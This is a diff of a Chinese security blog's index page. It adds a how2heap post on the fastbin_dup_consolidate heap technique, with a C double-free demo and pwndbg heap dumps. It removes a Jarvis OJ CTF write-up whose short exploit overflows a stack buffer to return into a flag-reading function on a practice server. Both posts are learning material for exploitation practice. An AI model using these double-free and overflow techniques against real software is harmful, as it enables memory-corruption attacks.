@@ -251,6 +251,156 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/09/fastbin_dup_consolidate/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/09/fastbin_dup_consolidate/" itemprop="url">fastbin_dup_consolidate</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T14:50:35+08:00">
+                2019-08-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/how2heap/" itemprop="url" rel="index">
+                    <span itemprop="name">how2heap</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Double-free绕过机制"><a href="#0x01-Double-free绕过机制" class="headerlink" title="0x01 Double free绕过机制"></a>0x01 Double free绕过机制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我们上一条 <span class="number">0x02</span> 介绍了一个 fast double free 的绕过机制，通过在free 同一个 chunk中的中间插入对另外一个chunk 的free。</span><br><span class="line">free(p1);</span><br><span class="line">free(p2);</span><br><span class="line">free(p1);</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-源代码"><a href="#0x02-源代码" class="headerlink" title="0x02 源代码"></a>0x02 源代码</h3><p>结合堆入坑指南看更好理解</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"> 编译后 gdb运行</span><br><span class="line"> 首先是两个malloc</span><br><span class="line"> ![](https://xzfile.aliyuncs.com/media/upload/picture/<span class="number">20180816002014</span><span class="number">-1718</span>ab98-a0a7<span class="number">-1.</span>png)</span><br><span class="line"> Pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x6020a0</span></span><br><span class="line">Last Remainder: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>, <span class="comment">###只有在前面一个堆块是空闲的时候才有值，用来只是前一个堆块的大小。前面一个堆块在使用时他的值始终为0</span></span><br><span class="line">  size = <span class="number">0x51</span>, <span class="comment">### 用来指示当前堆块的大小的(头部加上user data的大小)</span></span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602050</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x51</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6020a0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x20f61</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">然后释放 p1,将它加入到 astbins中 <span class="comment">###堆入坑指南有详细介绍</span></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x602000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">当我们在中插入 malloc(<span class="number">0x400</span>) 创建一个 large bins的时候</span><br><span class="line">large bins</span><br><span class="line">chunk 的指针数组, 每个元素是一条 双向循环链表的头部, 但同一条链表中块的大小不一 定相同, 按照从大到小的顺序排列, 每个 bin 保存一定 大小范围的块。主要保存大小 <span class="number">1024</span> 字节以上的块。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">Pwndbg&gt; small bins</span><br><span class="line">No symbol <span class="string">"bins"</span> <span class="keyword">in</span> current context.</span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x7ffff7dd1b68</span> (main_arena+<span class="number">104</span>) ◂— <span class="number">0x7ffff7dd1b68</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">120</span>) ◂— <span class="number">0x7ffff7dd1b78</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">136</span>) ◂— <span class="number">0x7ffff7dd1b88</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x602000</span> —▸ <span class="number">0x7ffff7dd1b98</span> (main_arena+<span class="number">152</span>) ◂— <span class="number">0x602000</span></span><br><span class="line"></span><br><span class="line">我们会发现 原本在 fastbins 的 chunk p1 跑到了 small bins 里。而且 chunk p2 的prev_size 和size字段都被修改了</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: <span class="number">0x6024b0</span></span><br><span class="line">Last Remainder: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x51</span>,</span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b98</span> &lt;main_arena+<span class="number">152</span>&gt;,</span><br><span class="line">  bk = <span class="number">0x7ffff7dd1b98</span> &lt;main_arena+<span class="number">152</span>&gt;,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602050</span> &#123;</span><br><span class="line">  prev_size = <span class="number">0x50</span>, <span class="comment">### 说明前一块是空闲的</span></span><br><span class="line">  size = <span class="number">0x50</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6020a0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x411</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x6024b0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0x0</span>,</span><br><span class="line">  size = <span class="number">0x20b51</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">我们可以看看 large bin的分配</span><br><span class="line">/*</span><br><span class="line">     If this <span class="keyword">is</span> a large request, consolidate fastbins before continuing.</span><br><span class="line">     While it might look excessive to kill all fastbins before</span><br><span class="line">     even seeing <span class="keyword">if</span> there <span class="keyword">is</span> space available, this avoids</span><br><span class="line">     fragmentation problems normally associated <span class="keyword">with</span> fastbins.</span><br><span class="line">     Also, <span class="keyword">in</span> practice, programs tend to have runs of either small <span class="keyword">or</span></span><br><span class="line">     large requests, but less often mixtures, so consolidation <span class="keyword">is</span> <span class="keyword">not</span></span><br><span class="line">     invoked all that often <span class="keyword">in</span> most programs. And the programs that</span><br><span class="line">     it <span class="keyword">is</span> called frequently <span class="keyword">in</span> otherwise tend to fragment.</span><br><span class="line">   */</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 malloc_consolidate() 函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。这个时候我们就可以再次释放 p1</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x602000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">Pwndbg&gt; smallbins</span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x7ffff7dd1b68</span> (main_arena+<span class="number">104</span>) ◂— <span class="number">0x7ffff7dd1b68</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">120</span>) ◂— <span class="number">0x7ffff7dd1b78</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7ffff7dd1b88</span> (main_arena+<span class="number">136</span>) ◂— <span class="number">0x7ffff7dd1b88</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x602000</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">这个时候，我们既有fastbins中的 chunk p1 也有small bins 的chunk p2。我们可以malloc两次，第一次从fastbins取出，第二次从small bins中取出。且这两块新 chunk 处于同一个位置。</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated two fastbins: p1=<span class="number">0x220a010</span> p2=<span class="number">0x220a060</span></span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=<span class="number">0x220a0b0</span></span><br><span class="line">In malloc_consolidate(), p1 <span class="keyword">is</span> moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can <span class="keyword">pass</span> the check <span class="keyword">in</span> malloc() since p1 <span class="keyword">is</span> <span class="keyword">not</span> fast top.</span><br><span class="line">Now p1 <span class="keyword">is</span> <span class="keyword">in</span> unsorted bin <span class="keyword">and</span> fast bin. So we<span class="string">'will get it twice: 0x220a010 0x220a010</span></span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/08/堆入坑指南/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1560,156 +1710,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/tell me someting/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/31/tell me someting/" itemprop="url">tell me something</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-31T12:55:23+08:00">
-                2019-07-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/jarvis-OJ/" itemprop="url" rel="index">
-                    <span itemprop="name">jarvis OJ</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ file guestbook.d3d5869bd6fb04dd35b29c67426c0f05 </span><br><span class="line">guestbook.d3d5869bd6fb04dd35b29c67426c0f05: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=7429502fc855237f3f8eeceb262ddcf6b2c2854e, not stripped</span><br><span class="line"></span><br><span class="line">64位程序</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Downloads$ checksec guestbook.d3d5869bd6fb04dd35b29c67426c0f05</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/guestbook.d3d5869bd6fb04dd35b29c67426c0f05'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">只开启nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; // [rsp+0h] [rbp-88h]</span><br><span class="line"></span><br><span class="line">  write(1, <span class="string">"Input your message:\n"</span>, 0x14uLL);</span><br><span class="line">  <span class="built_in">read</span>(0, &amp;v4, 0x100uLL);</span><br><span class="line">  <span class="built_in">return</span> write(1, <span class="string">"I have received your message, Thank you!\n"</span>, 0x29uLL);</span><br><span class="line">&#125;</span><br><span class="line">有个<span class="built_in">read</span>栈溢出漏洞 </span><br><span class="line"></span><br><span class="line">int good_game()</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; // rbx</span><br><span class="line">  int result; // eax</span><br><span class="line">  char buf; // [rsp+Fh] [rbp-9h]</span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fgetc(v0);</span><br><span class="line">    buf = result;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == -1 )</span><br><span class="line">      <span class="built_in">break</span>;</span><br><span class="line">    write(1, &amp;buf, 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">有个fopenflag 就很简单了 溢出返回就可以了</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看main函数的栈</span><br><span class="line">-0000000000000088                 db ? ; undefined</span><br><span class="line">-0000000000000087                 db ? ; undefined</span><br><span class="line">-0000000000000086                 db ? ; undefined</span><br><span class="line">-0000000000000085                 db ? ; undefined</span><br><span class="line">-0000000000000084                 db ? ; undefined</span><br><span class="line"></span><br><span class="line">0x88位就可以溢出</span><br><span class="line"></span><br><span class="line">查看good_game的地址</span><br><span class="line">.text:0000000000400620                 push    rbx</span><br><span class="line">.text:0000000000400621                 mov     esi, offset modes ; <span class="string">"r"</span></span><br><span class="line">.text:0000000000400626                 mov     edi, offset filename ; <span class="string">"flag.txt"</span></span><br><span class="line">.text:000000000040062B                 sub     rsp, 10h</span><br><span class="line">.text:000000000040062F                 call    _fopen</span><br><span class="line">.text:0000000000400634                 mov     rbx, rax</span><br><span class="line">.text:0000000000400637                 jmp     short loc_400654</span><br><span class="line"></span><br><span class="line">0x400620为sys_addr</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">学习使用zio库</span><br><span class="line"></span><br><span class="line">import zio</span><br><span class="line">payload = <span class="string">"A"</span> * 0x88 + <span class="string">"\x20\x06\x40\x00\x00\x00\x00\x00"</span></span><br><span class="line">p = zio.zio((<span class="string">"pwn.jarvisoj.com"</span>, 9876))</span><br><span class="line">p.write(payload)</span><br><span class="line">p.interact()</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1755,7 +1760,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
